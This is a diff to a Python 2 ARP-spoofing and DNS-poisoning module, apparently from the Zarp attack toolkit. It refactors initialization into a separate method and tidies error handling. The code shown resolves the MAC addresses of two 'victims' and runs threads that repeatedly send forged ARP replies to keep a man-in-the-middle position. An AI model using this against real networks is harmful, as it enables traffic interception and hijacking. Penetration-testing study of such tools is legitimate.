@@ -8,9 +8,6 @@ import config
 import gc
 
 #
-# Dependencies: 
-#	Scapy with Zarp patch	
-# 
 # This module implements both the ARP spoof and the DNS poison.  These are tightly 
 # coupled to improve performance and stability, considering how very delicate a DNS poison is.
 #
@@ -46,12 +43,17 @@ class ARPSpoof:
 			tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(self.to_ip, self.from_ip))
 		except Exception, j:
 			debug('Error loading ARP poisoning module: %s'%(j))
-			return
+			return None
 		if "n" in tmp.lower():
 			return
-		Msg("[!] Initializing ARP poison..")
+		Msg("[!] Initializing ARP poison...")
+		return self.initialize_post_spoof()
+
+	# separated from mainline initialization so we can run this post-var configuration 
+	# WARNING: if you're calling this, BE SURE you've set up all the stuff that needs to be.
+	def initialize_post_spoof(self):
 		try:
-			# get mac addresses for the two victims
+			# get mac addresses for both victims
 			self.to_mac = getmacbyip(self.to_ip)
 			self.from_mac = getmacbyip(self.from_ip)
 			# send ARP replies to victim
@@ -59,23 +61,23 @@ class ARPSpoof:
 			victim_thread = Thread(target=self.respoofer, args=(self.from_ip, self.to_ip))
 			victim_thread.start()
 			# send ARP replies to spoofed address
-			debug('Beginning ARP spoof to spoofed host...')
 			target_thread = Thread(target=self.respoofer, args=(self.to_ip, self.from_ip))
 			target_thread.start()
 			self.spoofing = True
 		except KeyboardInterrupt:
 			Msg('Closing ARP poison down...')
-			return
+			self.spoofing = False
+			return None
 		except TypeError, t:
 			Error('Type error: %s'%t)
-			traceback.print_exc(file=sys.stdout)
-			return
+			self.spoofing = False
+			return None
 		except Exception, j:
-			Error('Error sniffing: %s'%(j))
-			return
-		# return to_ip for storage
+			Error('Error with ARP poisoner: %s'%j)
+			self.spoofing = False
+			return None
 		return self.to_ip
-	
+			
 	#
 	# Casually respoof the victim/target at random intervals so we don't lose our entry in the ARP cache 
 	#
@@ -88,7 +90,7 @@ class ARPSpoof:
 				time.sleep(3)
 		except Exception, j:
 			Error('Spoofer error: %s'%j)
-			return 
+			return None
 	
 	#
 	# Eventually we'll want to stop sniffing (closing down, etc); this callback 
